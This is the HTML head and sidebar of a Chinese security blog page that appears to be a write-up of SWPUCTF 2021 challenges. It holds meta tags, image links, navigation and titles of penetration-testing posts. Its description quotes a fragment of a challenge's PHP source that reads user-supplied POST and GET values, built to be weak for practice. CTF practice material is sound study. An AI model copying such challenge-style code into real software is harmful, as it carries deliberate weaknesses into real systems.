
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>hybcx's blog</title>

  
    <meta name="description" content="[SWPUCTF 2021 新生赛]gift_F12  简单的js源码泄露 [SWPUCTF 2021 新生赛]jicao &lt;?php highlight_file(&#39;index.php&#39;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#39;id&#39;]; $json&#x3D;json_decode($_GET[&#39;json&#39;],true); if ($id&#x3D;&#x3D;&quot;wllmNB&quot;&amp;">
<meta property="og:type" content="article">
<meta property="og:title" content="hybcx&#39;s blog">
<meta property="og:url" content="http://hybcx.xyz/2024/03/03/swpuctf/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="[SWPUCTF 2021 新生赛]gift_F12  简单的js源码泄露 [SWPUCTF 2021 新生赛]jicao &lt;?php highlight_file(&#39;index.php&#39;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#39;id&#39;]; $json&#x3D;json_decode($_GET[&#39;json&#39;],true); if ($id&#x3D;&#x3D;&quot;wllmNB&quot;&amp;">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303154602248.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303155609807.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303160406743.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303161800565.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303163823373.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303164036596.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165909827.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165922060.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165930107.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165955408.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303173135507.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174306125.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174740360.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303175341797.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185953676.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185944862.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190251141.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190329438.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190723699.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303191538892.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192415788.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192838844.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192914464.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303193005353.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194201575.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194218237.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303194242292.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303195140537.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303200129685.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303203715901.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204310579.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204338590.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204811480.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303204821994.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205018625.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303205030022.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210123025.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210303084.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303210521940.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309153637104.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160026069.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160236384.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160245118.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309160218939.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161511392.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161604787.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309161936041.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162236676.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309162256195.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163418985.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163438380.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163556215.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309163728434.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309165918346.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170643719.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170924979.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309170949358.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171205453.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309171612435.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240309180110365.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310154828298.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310161450280.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310211459155.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311183646287.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185536689.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185647009.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185803235.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185809454.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185902055.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190025065.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190219520.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311192317024.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311194527648.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311201853066.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311203334975.png">
<meta property="og:image" content="c:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240311220803921.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312173603813.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312174103182.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312191657763.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312192658066.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312193713044.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211623343.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312194518200.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211035922.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240312211554502.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313160430851.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313161413778.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313171243987.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170858005.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313170924146.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313183346732.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184641627.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184836860.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313184906275.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313192109988.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194521226.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313194708793.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211135632.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313211955346.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313212144086.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240313215232524.png">
<meta property="og:image" content="c:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240314182950844.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183045200.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183312073.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183343645.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183433797.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183440690.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314183457120.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185849430.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190750425.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314190933860.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314191047978.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184826656.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314184936138.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185055756.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314185404845.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314200523714.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314202405761.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314203310329.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314204944475.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314210636888.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211604484.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240314211913669.png">
<meta property="og:image" content="c:%5CUsers%5C%E4%BB%98%E6%80%9D%E9%92%A7%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240315082601481.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315082623850.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315084313385.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315103831829.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315114631730.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315120703273.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121059169.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121539479.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240315121618906.png">
<meta property="article:published_time" content="2024-03-03T07:41:54.169Z">
<meta property="article:modified_time" content="2024-04-07T06:50:37.856Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="CTF赛事">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303154602248.png">
  
  
  
  <meta name="keywords" content="CTF赛事">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/06/29/xuan-ji-ying-ji-xiang-ying-ba-chang/"><span class="title">玄机应急响应靶场</span></a><a class="item title" href="/2024/06/15/du-web-gong-fang-you-gan/"><span class="title">读web攻防有感</span></a><a class="item title" href="/2024/06/17/thm-corp/"><span class="title">THM-Corp</span></a><a class="item title" href="/2024/06/16/thm-hacking-with-powershell/"><span class="title">THM-Hacking_With_PowerShell</span></a><a class="item title" href="/2024/06/10/thm-exploiting-active-directory/"><span class="title">THM-Exploiting Active Directory</span></a><a class="item title" href="/2024/06/11/thinkphp5-dai-shen/"><span class="title">ThinkPHP5代码审计</span></a><a class="item title" href="/2024/06/01/seacms-dai-ma-shen-ji/"><span class="title">SeaCMS代码审计</span></a><a class="item title" href="/2024/06/09/thm-enumerating-active-directory/"><span class="title">THM-Enumerating Active Directory</span></a><a class="item title" href="/2024/02/19/thm-persisting-active-directory/"><span class="title">THM-Persisting Active Directory</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
